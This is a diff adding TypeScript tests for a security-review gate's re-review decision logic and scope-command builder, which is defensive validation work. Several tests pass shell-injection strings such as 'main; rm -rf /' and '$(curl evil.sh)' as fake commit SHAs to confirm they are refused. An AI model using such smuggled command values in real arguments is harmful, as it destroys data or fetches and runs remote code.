@@ -3,7 +3,12 @@ import { readFileSync } from "fs";
 import { join } from "path";
 
 import { assertMarkedBlockReachable } from "../lib/reachability";
+import type { ReReviewDecision } from "../lib/security-verdict";
 import {
+  RE_REVIEW,
+  REVIEW_CURRENT,
+  SECURITY_REREVIEW_EXHAUSTED,
+  reReviewDecision,
   reviewIsCurrent,
   rookGateVerdict,
   rookReviewSha,
@@ -1052,3 +1057,257 @@ async function runFanoutPrompts(): Promise<string[]> {
   await done;
   return prompts;
 }
+
+// ── #171 ────────────────────────────────────────────────────────────────
+
+/**
+ * The two currencies every #171 case is built from are MEASURED, not written
+ * out by hand.
+ *
+ * A matrix of literal `{ current: false, reason: "..." }` objects is a test of
+ * object destructuring wearing a decision function's clothes: it stays green
+ * when `reviewIsCurrent` stops distinguishing anything, because the test
+ * supplies the distinction itself. These two come out of the real function,
+ * over the real #164 pair, so a `reviewIsCurrent` that collapsed would take the
+ * matrix below with it.
+ */
+const CURRENT_CURRENCY = reviewIsCurrent(SHA, SHA);
+const STALE_CURRENCY = reviewIsCurrent("3fe336f1", OTHER_SHA);
+
+/**
+ * A currency object whose `current` cannot be read without throwing.
+ *
+ * Not an exotic case: the decision function is called on the path that decides
+ * whether a run may ship, and a throw there is a refusal the caller's error
+ * handling can turn back into a ship — the same reasoning that keeps
+ * `reviewIsCurrent` throw-free.
+ */
+const EXPLODING_CURRENCY = Object.defineProperty({}, "current", {
+  get() {
+    throw new Error("currency getter exploded");
+  },
+  enumerable: true,
+});
+
+/**
+ * [label, currency, round, cap, expected decision]
+ *
+ * One matrix, three required refusing inputs named by the sub-issue — a
+ * non-number round count, a cap of zero, and a malformed currency object — and
+ * the positive rows that stop the refusals from being satisfied by a function
+ * that refuses everything.
+ */
+const REREVIEW_MATRIX: Array<[string, unknown, unknown, unknown, ReReviewDecision]> = [
+  // ── current: the review still describes the branch, so nothing re-runs ──
+  ["a current review", CURRENT_CURRENCY, 0, 2, REVIEW_CURRENT],
+  ["a current review with rounds already spent", CURRENT_CURRENCY, 2, 2, REVIEW_CURRENT],
+  ["a current review with no budget at all", CURRENT_CURRENCY, 0, 0, REVIEW_CURRENT],
+
+  // ── re-review: stale, and budget remains ──
+  ["stale on the first round of two", STALE_CURRENCY, 0, 2, RE_REVIEW],
+  ["stale on the second round of two", STALE_CURRENCY, 1, 2, RE_REVIEW],
+  ["stale with a single round available", STALE_CURRENCY, 0, 1, RE_REVIEW],
+
+  // ── exhausted: stale, and the budget is spent ──
+  ["stale with the cap reached", STALE_CURRENCY, 2, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["stale past the cap", STALE_CURRENCY, 7, 2, SECURITY_REREVIEW_EXHAUSTED],
+
+  // ── a cap of zero: there was never a re-review to spend ──
+  ["a cap of zero", STALE_CURRENCY, 0, 0, SECURITY_REREVIEW_EXHAUSTED],
+  ["a negative cap", STALE_CURRENCY, 0, -1, SECURITY_REREVIEW_EXHAUSTED],
+
+  // ── a non-number round count ──
+  ["a round count that is a string", STALE_CURRENCY, "1", 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a round count that is missing", STALE_CURRENCY, undefined, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a round count that is null", STALE_CURRENCY, null, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a round count that is NaN", STALE_CURRENCY, NaN, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a round count that is Infinity", STALE_CURRENCY, Infinity, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a fractional round count", STALE_CURRENCY, 1.5, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a negative round count", STALE_CURRENCY, -1, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a round count that is an object", STALE_CURRENCY, {}, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a cap that is a string", STALE_CURRENCY, 0, "2", SECURITY_REREVIEW_EXHAUSTED],
+  ["a cap that is missing", STALE_CURRENCY, 0, undefined, SECURITY_REREVIEW_EXHAUSTED],
+  ["a cap that is NaN", STALE_CURRENCY, 0, NaN, SECURITY_REREVIEW_EXHAUSTED],
+
+  // ── a malformed currency object ──
+  ["a currency that is missing", undefined, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a currency that is null", null, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a currency that is a string", "CURRENT", 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a currency that is an empty object", {}, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a currency that is an array", [], 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a currency whose current is a string", { current: "yes", reason: null }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a currency whose current is truthy but not true", { current: 1, reason: null }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a stale currency with no reason", { current: false }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a stale currency with a blank reason", { current: false, reason: "  " }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a stale currency whose reason is not a string", { current: false, reason: 42 }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  // A contradiction, not a pass: "current, and here is why it is not current"
+  // is the same shape as a PASS carrying broken ids, and waving it through is
+  // the fail-open that survives every test written against the happy path.
+  ["a current currency carrying a reason", { current: true, reason: "stale" }, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a currency that is a function", () => ({ current: true, reason: null }), 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+  ["a currency whose getter throws", EXPLODING_CURRENCY, 0, 2, SECURITY_REREVIEW_EXHAUSTED],
+];
+
+describe("#171 AC-1: the re-review decision maps currency + round + cap onto one verdict", () => {
+  for (const [label, currency, round, cap, expected] of REREVIEW_MATRIX) {
+    test(`${label} → ${expected}`, () => {
+      const out = reReviewDecision(currency, round, cap);
+      expect(out.decision, `${label}: the decision was ${out.decision}`).toBe(expected);
+    });
+  }
+
+  test("every row lands on exactly one of the three verdicts", () => {
+    // "Exactly one of" is a property of the function, not of the rows above: a
+    // fourth return value, or a decision outside the union, would satisfy every
+    // row that happened not to name it.
+    const allowed = [REVIEW_CURRENT, RE_REVIEW, SECURITY_REREVIEW_EXHAUSTED];
+    expect(new Set(allowed).size, "two of the three verdict names are the same string").toBe(3);
+    for (const [label, currency, round, cap] of REREVIEW_MATRIX) {
+      const out = reReviewDecision(currency, round, cap);
+      expect(allowed, `${label}: ${out.decision} is not one of the three verdicts`).toContain(
+        out.decision,
+      );
+    }
+  });
+
+  test("nothing in the matrix throws — a throw here is a refusal the caller can swallow", () => {
+    for (const [label, currency, round, cap] of REREVIEW_MATRIX) {
+      expect(() => reReviewDecision(currency, round, cap), label).not.toThrow();
+    }
+    for (const bad of [Symbol.iterator, () => {}, new Date(), NaN, Infinity, -0]) {
+      expect(() => reReviewDecision(bad as unknown, bad as unknown, bad as unknown)).not.toThrow();
+      expect(() => reReviewDecision(STALE_CURRENCY, bad as unknown, bad as unknown)).not.toThrow();
+    }
+  });
+
+  test("a refusal says why and a CURRENT carries no reason", () => {
+    // A reason on a CURRENT would let a caller that tests the reason for
+    // truthiness refuse a review that is fine; a refusal with no reason is one
+    // nobody can act on.
+    for (const [label, currency, round, cap, expected] of REREVIEW_MATRIX) {
+      const out = reReviewDecision(currency, round, cap);
+      if (expected === REVIEW_CURRENT) {
+        expect(out.reason, `${label}: a current review carried a reason`).toBeNull();
+      } else {
+        expect(typeof out.reason, `${label}: ${expected} carried no reason`).toBe("string");
+        expect(out.reason!.trim().length, label).toBeGreaterThan(0);
+      }
+    }
+  });
+
+  test("the exhaustion refusal names the round and the cap it ran out at", () => {
+    const out = reReviewDecision(STALE_CURRENCY, 2, 2);
+    expect(out.decision).toBe(SECURITY_REREVIEW_EXHAUSTED);
+    expect(out.reason).toContain("2");
+    // And it still carries what reviewIsCurrent said, so the refusal names the
+    // two commits rather than only the budget.
+    expect(out.reason).toContain("3fe336f1");
+  });
+
+  test("a re-review carries the staleness reason through unchanged", () => {
+    const out = reReviewDecision(STALE_CURRENCY, 0, 2);
+    expect(out.decision).toBe(RE_REVIEW);
+    expect(out.reason).toBe(STALE_CURRENCY.reason);
+  });
+
+  test("the currencies this matrix is built from are the real ones", () => {
+    // The guard on the fixture: if reviewIsCurrent ever returned `current:true`
+    // for the #164 pair, every RE_REVIEW and exhaustion row above would quietly
+    // become a CURRENT row and the matrix would still be green.
+    expect(CURRENT_CURRENCY).toEqual({ current: true, reason: null });
+    expect(STALE_CURRENCY.current, "the #164 pair is being read as current").toBe(false);
+    expect(STALE_CURRENCY.reason).toContain("3fe336f1");
+  });
+});
+
+describe("#171 AC-4: the exhaustion verdict name is declared once", () => {
+  const lib = readFileSync(join(REPO_ROOT, "lib", "security-verdict.ts"), "utf-8");
+
+  test("exactly one exported declaration of it", () => {
+    expect(
+      (lib.match(/export const SECURITY_REREVIEW_EXHAUSTED\s*=/g) || []).length,
+      "the exhaustion verdict is declared more than once (or not as an exported constant) — " +
+        "a second spelling is a refusal path the first one's tests never reach",
+    ).toBe(1);
+  });
+
+  test("the string itself is written exactly once", () => {
+    // The stronger half: a constant plus a hard-coded copy somewhere else is
+    // two declarations wearing one name, and the `export const` count above
+    // cannot see the copy.
+    expect(
+      (lib.match(/["'`]SECURITY_REREVIEW_EXHAUSTED["'`]/g) || []).length,
+      "the exhaustion verdict name is spelled out more than once in lib/security-verdict.ts",
+    ).toBe(1);
+  });
+
+  test("the constant's value is the verdict name callers compare against", () => {
+    expect(SECURITY_REREVIEW_EXHAUSTED).toBe("SECURITY_REREVIEW_EXHAUSTED");
+  });
+});
+
+describe("#171 AC-2: the re-review scope is based on the commit already reviewed", () => {
+  // Executed, not grepped. A test that read lib/security-verdict.ts for the
+  // text "--base" would pass over a function that builds the flag in a branch
+  // nothing reaches.
+
+  test("the command diffs the remediation commit against the reviewed one", () => {
+    const cmd = rookScopeCommand("/p", "/h", OTHER_SHA, "/w/scope.json", SHA);
+    expect(cmd).toContain(`--base ${SHA}`);
+    expect(cmd).toContain(`--sha ${OTHER_SHA}`);
+    // Order matters only in that the base must be the REVIEWED commit and the
+    // sha the REMEDIATION one — inverting them reviews the change backwards.
+    expect(cmd.indexOf(`--base ${SHA}`)).toBeLessThan(cmd.indexOf(`--sha ${OTHER_SHA}`));
+  });
+
+  test("an abbreviated reviewed commit is normalised the same way the sha is", () => {
+    const cmd = rookScopeCommand("/p", "/h", OTHER_SHA, "/w/s.json", ` ${SHA.toUpperCase()} `);
+    expect(cmd).toContain(`--base ${SHA}`);
+  });
+
+  test("the reviewed commit is refused, not quoted, when it is not a SHA", () => {
+    for (const bad of ["HEAD", "main; rm -rf /", "", "$(curl evil.sh)", "origin/main", null, 42, {}]) {
+      expect(
+        () => rookScopeCommand("/p", "/h", OTHER_SHA, "/w/s.json", bad as unknown as string),
+        `${JSON.stringify(String(bad))} was accepted as the reviewed commit`,
+      ).toThrow(/not a commit SHA/i);
+    }
+  });
+
+  test("the remediation commit is still refused when it is not a SHA", () => {
+    for (const bad of ["HEAD", "main; rm -rf /", "", "$(curl evil.sh)"]) {
+      expect(() => rookScopeCommand("/p", "/h", bad, "/w/s.json", SHA)).toThrow(/not a commit SHA/i);
+    }
+  });
+
+  test("nothing a refusal would have quoted reaches the command", () => {
+    // The point of refusing rather than quoting: there is no command at all to
+    // inspect. If a future edit quotes its way out of the throw, this catches
+    // the resulting string.
+    let built: string | null = null;
+    try {
+      built = rookScopeCommand("/p", "/h", OTHER_SHA, "/w/s.json", "main; rm -rf /");
+    } catch {
+      built = null;
+    }
+    expect(built, "a non-SHA base was quoted into the scope command instead of refused").toBeNull();
+  });
+
+  test("omitting the reviewed commit leaves the first-round command untouched", () => {
+    // ship.js carries an inlined four-argument copy of this function, and the
+    // parity test above compares the two. The reviewed commit is therefore an
+    // optional fifth argument: absent, the command must be byte-identical to
+    // what the workflow builds today, or the first review changes shape as a
+    // side effect of adding the second one.
+    const first = rookScopeCommand("/p", "/h", SHA, "/w/s.json");
+    expect(first).not.toContain("--base");
+    expect(first).toBe(inlined.rookScopeCommand("/p", "/h", SHA, "/w/s.json"));
+  });
+
+  test("the paths are still quoted when a base is present", () => {
+    const cmd = rookScopeCommand("/My Projects/p", "/h", OTHER_SHA, "/w/s.json", SHA);
+    expect(cmd).toContain(`--project ${shellQuote("/My Projects/p")}`);
+    expect(cmd).toContain(`cd ${shellQuote("/My Projects/p")}`);
+    expect(cmd).toContain(`--out ${shellQuote("/w/s.json")}`);
+  });
+});
